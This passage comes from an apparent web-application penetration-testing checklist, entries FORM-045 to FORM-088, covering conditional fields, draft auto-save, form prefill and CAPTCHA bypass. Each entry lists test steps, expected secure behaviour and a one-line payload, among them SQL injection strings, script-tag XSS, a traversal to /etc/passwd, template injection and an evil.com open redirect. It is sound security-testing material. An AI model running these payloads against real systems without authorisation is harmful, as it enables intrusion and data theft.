**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Conditional Fields

**Test Steps:** 1. Condition hides field B based on field A 2. Submit field B anyway 3. Bypass condition 4. Submit unauthorized data

**Expected Result:** Conditional logic should be server-enforced

**Payload Example:**

```
Submit hidden conditional field directly
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-046 — Conditional Validation Bypass
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Conditional Fields

**Test Steps:** 1. Field required conditionally 2. Condition not met 3. Submit field anyway 4. Bypass conditional requirement

**Expected Result:** Conditional validation should be server-side

**Payload Example:**

```
Submit conditionally required field without trigger
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## FORM-047 — Logic Injection via Condition Value
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Conditional Fields

**Test Steps:** 1. Condition based on user input 2. Inject logic operators 3. Manipulate condition evaluation 4. Bypass intended flow

**Expected Result:** Condition values should be sanitized

**Payload Example:**

```
trigger_field=' OR '1'='1
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-048 — Hidden Field Value Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Conditional Fields

**Test Steps:** 1. Field hidden by condition 2. Inspect DOM or response 3. Find hidden field values 4. Extract sensitive data

**Expected Result:** Hidden fields should not contain sensitive data

**Payload Example:**

```
Hidden fields with passwords or tokens visible in source
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-049 — Conditional XSS Trigger
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Conditional Fields

**Test Steps:** 1. Condition reveals field 2. XSS in conditional field 3. Trigger condition 4. XSS executes

**Expected Result:** Conditional fields should be sanitized

**Payload Example:**

```
<script>alert(1)</script> revealed by condition
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-050 — Race Condition on Conditional Update
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Conditional Fields

**Test Steps:** 1. Condition updates field 2. Submit before update 3. Win race 4. Submit with incorrect condition

**Expected Result:** Conditional updates should be atomic

**Payload Example:**

```
Submit during conditional processing
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## FORM-051 — Circular Dependency Exploit
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Conditional Fields

**Test Steps:** 1. Create circular conditions 2. Field A depends on B depends on A 3. Cause infinite loop 4. DoS client or server

**Expected Result:** Circular conditions should be detected

**Payload Example:**

```
A shows if B=1 B shows if A=1
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## FORM-052 — Conditional Default Value Manipulation
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Conditional Fields

**Test Steps:** 1. Field has conditional default 2. Intercept and modify default 3. Bypass intended default 4. Submit malicious default

**Expected Result:** Defaults should be server-set

**Payload Example:**

```
{"field":"",default_overridden:true}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## FORM-053 — Complex Condition SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Conditional Fields

**Test Steps:** 1. Complex condition stored 2. Inject SQL in condition 3. Condition evaluated 4. SQL executed

**Expected Result:** Conditions should not execute raw queries

**Payload Example:**

```
condition="field1='value' OR 1=1--"
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-054 — Condition State Tampering
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Conditional Fields

**Test Steps:** 1. Condition state stored 2. Intercept state 3. Modify condition state 4. Access unauthorized fields

**Expected Result:** Condition state should be signed

**Payload Example:**

```
Modify base64 condition_state parameter
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-055 — Draft IDOR Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Auto-Save / Draft

**Test Steps:** 1. Access own draft 2. Modify draft_id 3. Access another user's draft 4. View their unsaved data

**Expected Result:** Drafts should be user-specific

**Payload Example:**

```
GET /api/drafts/victim_draft_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-056 — Draft IDOR Modification
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Auto-Save / Draft

**Test Steps:** 1. Modify own draft 2. Change draft_id 3. Modify another's draft 4. Inject data into their form

**Expected Result:** Modification should verify ownership

**Payload Example:**

```
PUT /api/drafts/victim_draft_id {"field":"hacked"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-057 — Draft IDOR Deletion
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Auto-Save / Draft

**Test Steps:** 1. Delete own draft 2. Modify draft_id 3. Delete another's draft 4. Destroy their unsaved work

**Expected Result:** Deletion should verify ownership

**Payload Example:**

```
DELETE /api/drafts/victim_draft_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-058 — Stored XSS in Draft
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Auto-Save / Draft

**Test Steps:** 1. Save draft with XSS 2. Auto-save persists XSS 3. User resumes draft 4. XSS executes

**Expected Result:** Draft content should be sanitized

**Payload Example:**

```
<script>stealSession()</script> in draft field
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-059 — Draft Enumeration
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Auto-Save / Draft

**Test Steps:** 1. Iterate through draft IDs 2. Find valid drafts 3. Map user activity 4. Privacy violation

**Expected Result:** Draft IDs should be unpredictable

**Payload Example:**

```
/drafts/1 through /drafts/10000
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder / ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## FORM-060 — Auto-Save Flooding
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Auto-Save / Draft

**Test Steps:** 1. Trigger auto-save rapidly 2. Flood server with saves 3. Exhaust resources 4. DoS

**Expected Result:** Auto-save should be rate-limited

**Payload Example:**

```
100 auto-save requests per second
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-061 — Draft Version Confusion
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Auto-Save / Draft

**Test Steps:** 1. Multiple auto-saves create versions 2. Submit old version 3. Overwrite newer data 4. Data loss or manipulation

**Expected Result:** Version handling should be clear

**Payload Example:**

```
Submit outdated draft version
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## FORM-062 — Draft Sensitive Data Exposure
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Auto-Save / Draft

**Test Steps:** 1. Draft stored in localStorage 2. Access localStorage 3. Extract draft data 4. Sensitive info exposed

**Expected Result:** Sensitive drafts should be secure

**Payload Example:**

```
Check localStorage for PII in drafts
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-063 — Draft Persistence After Logout
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Auto-Save / Draft

**Test Steps:** 1. Save draft 2. Logout 3. Access draft location 4. Draft still accessible

**Expected Result:** Drafts should be cleared on logout

**Payload Example:**

```
Access cached draft after logout
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Browser

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## FORM-064 — Concurrent Auto-Save Conflict
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Auto-Save / Draft

**Test Steps:** 1. Auto-save from two sessions 2. Conflicting saves 3. Data corruption 4. Lost updates

**Expected Result:** Concurrent saves should be handled

**Payload Example:**

```
Parallel auto-save from multiple tabs
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Multiple Browsers

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## FORM-065 — Draft Recovery Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Auto-Save / Draft

**Test Steps:** 1. Draft requires verification to recover 2. Bypass verification 3. Access draft directly 4. View unverified data

**Expected Result:** Recovery should enforce verification

**Payload Example:**

```
Direct access to /drafts/sensitive_draft
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-066 — Draft Metadata Leakage
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Auto-Save / Draft

**Test Steps:** 1. View draft metadata 2. Find creation time IP user info 3. Extract metadata 4. Privacy violation

**Expected Result:** Metadata should not expose sensitive info

**Payload Example:**

```
Draft API returning author IP or session details
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-067 — Prefill Parameter Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Prefill

**Test Steps:** 1. Form prefilled from URL params 2. Modify prefill values 3. Inject unauthorized data 4. Bypass intended prefill

**Expected Result:** Prefill should validate against allowed values

**Payload Example:**

```
?email=victim@company.com&role=admin
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / URL Manipulation

**References:** CWE-840; PortSwigger Business logic

---

## FORM-068 — Prefill XSS via URL Parameter
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Form Prefill

**Test Steps:** 1. Prefill from URL parameter 2. Inject XSS in parameter 3. Share malicious URL 4. XSS executes on load

**Expected Result:** Prefill values should be sanitized

**Payload Example:**

```
?name=<script>alert('XSS')</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## FORM-069 — Prefill SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Form Prefill

**Test Steps:** 1. Prefill queries database 2. Inject SQL in prefill param 3. Extract data 4. Database compromise

**Expected Result:** Prefill queries should be parameterized

**Payload Example:**

```
?user_id=1' OR '1'='1'--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## FORM-070 — Prefill IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Prefill

**Test Steps:** 1. Prefill from user data 2. Modify user_id 3. Prefill with another user's data 4. Access their information

**Expected Result:** Prefill should verify ownership

**Payload Example:**

```
?prefill_user=victim_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-071 — Hidden Field Prefill Manipulation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Form Prefill

**Test Steps:** 1. Hidden fields prefilled 2. Identify hidden field names 3. Modify hidden values via URL 4. Bypass security controls

**Expected Result:** Hidden fields should not be prefillable

**Payload Example:**

```
?hidden_user_id=admin_id&hidden_role=superuser
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / URL Manipulation

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-072 — Prefill Cache Poisoning
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Prefill

**Test Steps:** 1. Prefill cached by CDN 2. Inject malicious prefill 3. Cache poisoned response 4. Serve to other users

**Expected Result:** Prefill responses should not be cached

**Payload Example:**

```
Cache poisoning on ?prefill=xss_payload
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## FORM-073 — Token Prefill Exposure
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Form Prefill

**Test Steps:** 1. Token in prefill URL 2. URL logged or shared 3. Token exposed 4. Session hijacking

**Expected Result:** Sensitive tokens should not be in URLs

**Payload Example:**

```
?session_token=abc123&prefill=true
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser History

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## FORM-074 — Prefill Open Redirect
**Test Category:** Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Form Prefill

**Test Steps:** 1. Prefill includes redirect 2. Modify redirect parameter 3. Redirect to malicious site 4. Phishing attack

**Expected Result:** Redirects should be validated

**Payload Example:**

```
?prefill=data&redirect=https://evil.com
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## FORM-075 — Prefill Path Traversal
**Test Category:** Path Traversal · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Form Prefill

**Test Steps:** 1. Prefill from file 2. Inject path traversal 3. Access system files 4. Information disclosure

**Expected Result:** File paths should be validated

**Payload Example:**

```
?prefill_file=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## FORM-076 — Prefill Template Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Form Prefill

**Test Steps:** 1. Prefill uses templates 2. Inject template syntax 3. Execute code 4. Server compromise

**Expected Result:** Templates should not process user input

**Payload Example:**

```
?name={{constructor.constructor('return this')()}}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## FORM-077 — Prefill Source Validation Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Form Prefill

**Test Steps:** 1. Prefill only from trusted sources 2. Spoof source 3. Bypass source check 4. Inject arbitrary prefill

**Expected Result:** Source validation should be robust

**Payload Example:**

```
Referer: https://trusted.com with malicious prefill
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / curl

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## FORM-078 — CAPTCHA Bypass via Replay
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. Solve CAPTCHA 2. Capture valid token 3. Replay token on new request 4. Bypass CAPTCHA

**Expected Result:** CAPTCHA tokens should be single-use

**Payload Example:**

```
Reuse captcha_token on multiple submissions
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-079 — CAPTCHA Removal from Request
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. CAPTCHA on form 2. Intercept submission 3. Remove CAPTCHA field 4. Submit without CAPTCHA

**Expected Result:** Server should require CAPTCHA

**Payload Example:**

```
Remove captcha parameter from POST
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-080 — CAPTCHA Case Sensitivity Bypass
**Test Category:** Input Validation · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. Text CAPTCHA requires exact match 2. Submit different case 3. Bypass case check 4. Submit without solving

**Expected Result:** CAPTCHA should be case-insensitive or clear

**Payload Example:**

```
AbCd vs ABCD vs abcd
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-081 — CAPTCHA Answer in Response
**Test Category:** Information Disclosure · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. Request CAPTCHA 2. Analyze response 3. Find answer in HTML/JS 4. Solve automatically

**Expected Result:** CAPTCHA answer should be server-only

**Payload Example:**

```
CAPTCHA answer in hidden field or JavaScript
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-082 — CAPTCHA OCR Bypass
**Test Category:** Bot Detection Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. Analyze CAPTCHA images 2. Use OCR tools 3. Automatically solve 4. Mass automation

**Expected Result:** CAPTCHA should resist OCR

**Payload Example:**

```
Tesseract or ML-based CAPTCHA solving
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Tesseract / Python PIL / ML Tools

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-083 — Audio CAPTCHA Bypass
**Test Category:** Bot Detection Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. Request audio CAPTCHA 2. Use speech recognition 3. Solve automatically 4. Bypass visual CAPTCHA

**Expected Result:** Audio should be equally difficult

**Payload Example:**

```
Speech-to-text on audio CAPTCHA
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Speech Recognition Tools

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-084 — CAPTCHA Rate Limiting Bypass
**Test Category:** Bot Detection Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. CAPTCHA after N attempts 2. Clear cookies/change IP 3. Reset attempt counter 4. Unlimited attempts

**Expected Result:** Rate limiting should use multiple factors

**Payload Example:**

```
Cookie clearing to reset CAPTCHA trigger
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / IP Rotation

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-085 — reCAPTCHA Key Exposure
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. Analyze page source 2. Find reCAPTCHA keys 3. Identify site key vs secret 4. Check for secret exposure

**Expected Result:** Secret key should never be client-side

**Payload Example:**

```
Secret key exposed in JavaScript
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-086 — reCAPTCHA Verification Bypass
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. Submit form with reCAPTCHA 2. Intercept verification 3. Modify verification response 4. Bypass check

**Expected Result:** Verification should be server-to-server

**Payload Example:**

```
Modify g-recaptcha-response or verification result
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## FORM-087 — CAPTCHA Session Fixation
**Test Category:** Session Management · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

**Test Steps:** 1. Get CAPTCHA session 2. Share with victim 3. Victim solves CAPTCHA 4. Use solved session

**Expected Result:** CAPTCHA should bind to user session

**Payload Example:**

```
Session fixation before CAPTCHA
```

**Impact:** Session fixation/hijack -&gt; attacker rides the victim's authenticated session.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-384; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Session management

---

## FORM-088 — Invisible reCAPTCHA Score Manipulation
**Test Category:** Bot Detection Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** CAPTCHA / Bot Protection

